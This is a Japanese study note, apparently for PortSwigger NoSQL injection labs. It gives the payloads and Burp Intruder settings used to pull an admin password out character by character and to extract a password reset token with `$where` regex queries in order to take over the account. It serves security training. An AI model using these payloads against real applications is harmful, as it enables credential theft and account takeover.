## Syntax injection

### adminのパスワードを抽出する

##### 💡
==⚠️== Null byteと先頭の`'`以外はURLエンコードする
真のときのレスポンスはGrep -Extractで指定する

###### ①抽出フィールドの名前をdetect

1. [[🔍NoSQLi#Boolean注入可能か？]]で真のときと偽のときのレスポンスをメモしておく
2. フィールド名に検討がついている時はその名前を、検討がつかない時はbrute-forceし、条件が真のときのレスポンスと同じものが返るフィールド名を探す

- `password`だと検討がついているとき
```
/user/lookup?user=administrator' && this.password%00x
```
- 検討がついていないとき(Intruder -> Payload settings -> Add from list -> Form field names -long)
```
/user/lookup?user=administrator' && this.§§%00x
```

###### ②抽出フィールドの値の長さをdetect

- `length`メソッドを使用
- Payload type : Numbers, Payload settingsで 1 ~ 50でbrute-force
```
/user/lookup?user=administrator' && this.password.length == §§%00x
```
- 真の値のときのレスポンスが変えればその数が正解

###### ③パスワードを抽出する

- Attack type : Cluster bomb
- Payload set 1： type= Numbers, From 0 to ステップ2で検出した文字数
- Payload set 2： type=Simple list, Add from list a-z & A-Z & 0-9
```
/user/lookup?user=administrator' && this.password[§0§]=='§a§
```

---
## Operator injection

###### 認証のバイパス攻撃

- APPERENTICE
- [[3. NoSQL operator injection#Operator injectionによる認証バイパス]]

### リセットトークン抽出

###### ①抽出フィールドの名前を抽出

1. [[🔍NoSQLi#2. `$where`が使えるかの確認]]での`$where`パラメタをIntruder上で以下に変更する
```json
"$where":"Object.keys(this)[0].match('^.{§§}§§.*')"
```
2. Attack type: Cluster bomb
3. Payload set 1 : Numbers,  FROM 0 TO 20
4. Payload set 2: Simple list, Add from list a-z & A-Z & 0-9
5. Start Attackで1つ目のフィールドを検出する
6. 2つ目のパラメタは`~(this)[2].match~`と変更するだけ。これを目的のフィールド名が得られるまで繰り返す(パスワードリセットトークンフィールド等)

###### ②目的のフィールド抽出

1. Forgot password機能のエンドポイントへ、上記で得られたフィールド名をパラメタにリクエストする
```http
GET /forgot-password?[パスワードリセットトークンフィールド]=
```
- Error: "Invalid token"を確認。つまりこのフィールド名とエンドポイントがパスワードリセットで使用するものだとわかる

2. [[#①抽出フィールドの名前を抽出]]で使用したIntruderの設定はそのままにして、`$where`パラメタを以下に変更する
```
"$where":"this.[パスワードリセットトークンフィールド].match('^.{§§}§§.*')"
```

3. 抽出したトークンでパスワードリセットする
```http
GET /forgot-password?[パスワードリセットトークンフィールド]=[抽出したトークン]
```


[Lab: Exploiting NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)

---
## (実践無)Timing based injection

- [[4. Timing based injection]]